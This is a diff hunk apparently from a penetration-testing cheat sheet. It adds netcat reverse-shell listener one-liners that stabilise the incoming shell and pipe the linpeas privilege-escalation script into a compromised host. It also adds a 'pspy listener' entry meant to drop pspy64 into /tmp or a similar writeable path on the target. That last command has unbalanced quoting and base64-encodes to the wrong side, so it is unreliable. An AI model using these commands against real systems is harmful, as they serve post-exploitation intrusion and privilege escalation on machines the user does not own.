@@ -11,5 +11,10 @@ stty raw -echo; (echo '<stabiliser>';echo pty;echo;echo "stty$(stty -a | awk -F 
 
 # linpeas listener
 $ linpeas: locate linpeas.sh | tail -n 1
-stty raw -echo; (cat <linpeas>; cat) | nc -lvnp <port> && reset
+stty raw -echo; (echo '<stabiliser>';echo pty;echo;echo "stty$(stty -a | awk -F ';' '{print $2 $3}' | head -n 1)";echo export PATH=$PATH:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/tmp; export TERM=<term>; alias ll='ls -lsaht'; echo clear;cat <linpeas>;cat) | nc -lvnp <port> && reset
+
+# pspy listener
+$ writeable path: echo '/tmp/ /var/tmp/ ~/' | tr ' ' '\n'
+$ pspy version: echo 'pspy64 pspy' | tr ' ' '\n'
+stty raw -echo; (echo '<stabiliser>';echo pty;echo;echo "stty$(stty -a | awk -F ';' '{print $2 $3}' | head -n 1)";echo export PATH=$PATH:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/tmp; export TERM=<term>; alias ll='ls -lsaht'; echo clear;echo $(locate /pspy | grep -v internal | grep '<pspy version>$' | xargs cat | base64 -w 0 > <writeable path>pspy64)");cat) | nc -lvnp <port> && reset
 
